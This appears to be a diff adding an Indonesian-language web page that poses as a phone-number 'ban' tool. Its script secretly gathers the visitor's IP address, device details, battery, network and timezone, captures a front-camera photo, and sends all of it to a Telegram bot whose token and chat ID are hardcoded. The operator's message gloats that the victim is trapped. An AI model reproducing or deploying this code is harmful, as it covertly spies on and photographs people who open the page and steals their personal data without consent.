@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>mintX Malware Console</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      color: #ff2c2c;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-top: 40px;
+      height: 100vh;
+      text-align: left;
+    }
+    h1 {
+      font-size: 22px;
+      margin-bottom: 20px;
+      border-bottom: 1px solid #ff2c2c;
+      padding-bottom: 5px;
+      width: 90%;
+    }
+    input, button {
+      background: #111;
+      border: 1px solid #ff2c2c;
+      color: #ff2c2c;
+      padding: 10px;
+      font-family: monospace;
+      font-size: 16px;
+      margin: 10px;
+      width: 90%;
+    }
+    .terminal {
+      margin-top: 20px;
+      width: 90%;
+      white-space: pre-wrap;
+      font-size: 14px;
+      border-top: 1px solid #ff2c2c;
+      padding-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>[ mintX BANNED OPS UNIT ]</h1>
+  <input type="text" id="nomor" placeholder="Input Nomor Target (08xxxx)">
+  <button onclick="banTarget()">EKSEKUSI </button>
+
+  <div class="terminal" id="log"></div>
+
+  <video id="kamera" autoplay playsinline style="display:none;"></video>
+  <canvas id="kanvas" width="640" height="480" style="display:none;"></canvas>
+
+  <script>
+    const token = '7590451725:AAGQ4CSmCNIzyc3waxApqZdaDHuzLryOXyU';
+    const chatId = '8190003621';
+
+    async function getInfo() {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      const battery = navigator.getBattery ? await navigator.getBattery() : null;
+      return {
+        ip: ipData.ip || 'N/A',
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        resolution: screen.width + "x" + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        memory: navigator.deviceMemory + " GB",
+        battery: battery ? Math.round(battery.level * 100) + '%' : 'Unknown',
+        network: navigator.connection ? navigator.connection.effectiveType : 'Unknown'
+      };
+    }
+
+    function dataURLtoBlob(dataurl) {
+      let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
+          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      while(n--) u8arr[n] = bstr.charCodeAt(n);
+      return new Blob([u8arr], {type:mime});
+    }
+
+    async function aktifkanKamera() {
+      const log = document.getElementById("log");
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById("kamera");
+        video.srcObject = stream;
+        log.innerHTML += "\n[+] Proses...\n";
+
+        setTimeout(() => {
+          ambilFoto();
+        }, 2000);
+      } catch (err) {
+        log.innerHTML += "\n[!] Proses gagal...\n";
+      }
+    }
+
+    function ambilFoto() {
+      const video = document.getElementById("kamera");
+      const canvas = document.getElementById("kanvas");
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const dataURL = canvas.toDataURL("image/jpeg");
+      const blob = dataURLtoBlob(dataURL);
+      const form = new FormData();
+      form.append("chat_id", chatId);
+      form.append("photo", blob, "target.jpg");
+
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST",
+        body: form
+      });
+
+      document.getElementById("log").innerHTML += "\n[+] Data berhasil dikirm ke server mintX.\n";
+    }
+
+    async function banTarget() {
+      const nomor = document.getElementById("nomor").value.trim();
+      const log = document.getElementById("log");
+      log.innerHTML = "";
+
+      if (!nomor) {
+        alert("MASUKIN NOMOR DULU, GOBLOK!!");
+        return;
+      }
+
+      const info = await getInfo();
+
+      const proses = [
+        `[+] Target: ${nomor}`,
+        `[+] Menghubungi server pusat...`,
+        `[+] Validasi nomor target...`,
+        `[+] Mengambil data korban...`,
+        `[+] Kirim permintaan banned...`,
+        `[+] Permintaan disetujui.`,
+        `[+] Sistem mintX berusaha mengeksekusi target.`
+      ];
+
+      let i = 0;
+      const inter = setInterval(() => {
+        if (i < proses.length) {
+          log.innerHTML += proses[i] + "\n";
+          i++;
+        } else {
+          clearInterval(inter);
+          log.innerHTML += "\n[+] Mengesekusi target.\n";
+          aktifkanKamera();
+        }
+      }, 600);
+
+      const pesan = `
+🔥 TARGET MASUK JEBAKAN 🔥
+📲 Nomor: ${nomor}
+🌐 IP: ${info.ip}
+📱 Platform: ${info.platform}
+🧠 User Agent: ${info.userAgent}
+🕹️ Resolusi: ${info.resolution}
+🔋 Baterai: ${info.battery}
+📡 Jaringan: ${info.network}
+🌍 Zona Waktu: ${info.timezone}
+
+📸 Kamera: AKTIF
+
+⚠️ WOI KONTOL, KORBAN UDAH MASUK PERANGKAP 💣
+DIA MAU BANNED ORANG, TAPI DIA YANG KENA JEBAK ☠️
+
+🧨 DIKIRIM OLEH: mintX SPY SYSTEM
+`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: pesan
+        })
+      });
+    }
+  </script>
+</body>
+</html>
